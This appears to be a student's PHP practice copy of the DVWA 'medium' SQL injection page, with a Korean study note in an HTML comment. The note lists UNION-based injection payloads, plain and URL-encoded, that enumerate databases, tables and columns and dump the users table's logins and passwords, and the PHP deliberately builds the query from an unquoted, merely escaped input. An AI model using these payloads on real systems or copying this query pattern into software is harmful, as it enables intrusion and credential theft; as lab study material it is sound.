<!--
https://webhack.dynu.net/?idx=20161224.001&print=friendly
https://haruhiism.tistory.com/131?category=832125

일단 입력값을 입력이 아니라 선택하게 만들었으나
방어는 되나 특수문자를 \을 앞에 넣어서 방어하는 방식이라서
사용자 입력값(id)에 mysql_real_escape_string() PHP 함수를 처리
이 함수는 \x00, \n, \r, \, ', ", \x1a 문자에 역사선을 앞에 붙여서 SQL문으로 처리되는 것을 방지

그러나 공격이 안되는 건 아니다.
쿼리문에서 특수문자가 없다면 페킷 조작을 하여 명령문을 넣으면 명령문이 작동한다.
하나하나씩 보자 특수문자 ' 가 없다면 명령문이 실행된다.


// WHERE 구문 우회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 OR 1=1#
1+OR+1%3D1%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// UNION을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 UNION SELECT 1,1#
1+UNION+SELECT+1%2C1%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// ORDER BY 구문을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 ORDER BY 2#
1+ORDER+BY+2%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// 모든 데이터베이스 명 조회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 UNION SELECT SCHEMA_NAME,1 FROM INFORMATION_SCHEMA.SCHEMATA #
1+UNION+SELECT+SCHEMA_NAME%2C1+FROM+INFORMATION_SCHEMA.SCHEMATA+%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이를 통해 의심되는 데리터베이스를 찾아낼수 있다
이 과정으로 dvwa라는 데이터베이스안에 관련정보가 있다는 것을 알 수 있다.


// 모든 데이터베이스의 모든 테이블 명 조회*
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
1+UNION+SELECT+TABLE_SCHEMA%2C+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이렇게하면 단 직접보고 추론하고 판단해야하지만 어떤 db의 테이블까지 파악이 가능하다.
이 과정으로 dvwa라는 데이터베이스안에 users 라는 테이블에 관련 정보가 있다는 것을 알아낼 수 있다.


// 모든 데이터베이스 모든 테이블 모든 칼럼 조회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS#
1+UNION+SELECT+TABLE_NAME%2c+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이렇게하면 단 직접보고 어떤 db의 테이블의 칼럼인지 파악해야하긴하나 중요한건 시간이 걸려도 뚫린다는 것이다.
이 과정으로 dvwa라는 데이터베이스안에 users 라는 테이블안에 user 칼럼은 아이디를 password 칼럼은 패쓰워드를 갖고 있을 거라는 것을 예상할 수 있다.



//아이디, 비밀번호 탈취
--------------------------------------------------------------------------------------------------------------------------------------------------------------
5 UNION SELECT user,password FROM dvwa.users#
5+UNION+SELECT+user%2cpassword+FROM+dvwa.users%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
현재 이 사이트안에 있는 모든 아이디와 모든 패쓰워드를 탈취했다.
어떤 언어가 됬든
mysqli_real_escape_string()처럼 특수문자처리로는 sql injection을 막을 수 없다는 결론이다

-->

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">


</head>
    <?php
    include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";


    if( isset( $_POST[ 'Submit' ] ) ) {
        // Get input
        $id = $_POST[ 'id' ];

        $id = mysqli_real_escape_string($con, $id);
        //mysqli_real_escape_string 들어온 값을 db명령문이 들어오더라도 문자열로 바꾸어 주는 메소드

        $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
        //2.sql문을 거칠 것 같은 폼에 ' 을 입력하였는데도 1의 오류가 없다
        //보안이 어느 정도 되어는 있지만 잘 되어는 있는지 모른다.
        //이 경우 무언가로 검사후에 sql문으로 입력되는 구조로 '변수'가 아닌 변수로 이루어져 있을 것이다.
        //떄문에 ' 를 넣지 않는다
        //이 경우는 패킷조작 url 대체 코드를 입력해본다. 나머지는 대문자
        //단 url 대체 코드변환은 왠만하면 한자한자 바꿔야 반응할 확률이 높다.
        $result = mysqli_query($con, $query) or die( '<pre>' . mysqli_error($con) . '</pre>' );

        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Display values
            $first = $row["first_name"];
            $last  = $row["last_name"];


            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
        $query  = "SELECT COUNT(*) FROM users;";
        //테이블의 갯수를 세는 쿼리문 다른 방법도 있지만 속도가 매우 빠른 점이 특징
        $result = mysqli_query($con,  $query );
        $number_of_rows = mysqli_fetch_row( $result )[0];
        mysqli_close($con);
    }


    ?>


<body>
<div class="body_padded">
    <h1>Vulnerability: SQL Injection</h1>



    <div class="vulnerable_code_area">
        <form action="#" method="POST">
            <p>
                User ID:
                <select name="id">
                    <option value="1">1</option>
                    <option value="2">2</option>
                    <option value="3">3</option>
                    <option value="4">4</option>
                    <option value="5">5</option>
                </select>
                <input type="submit" name="Submit" value="Submit">
            </p>

        </form>

    </div>

</body>
</html>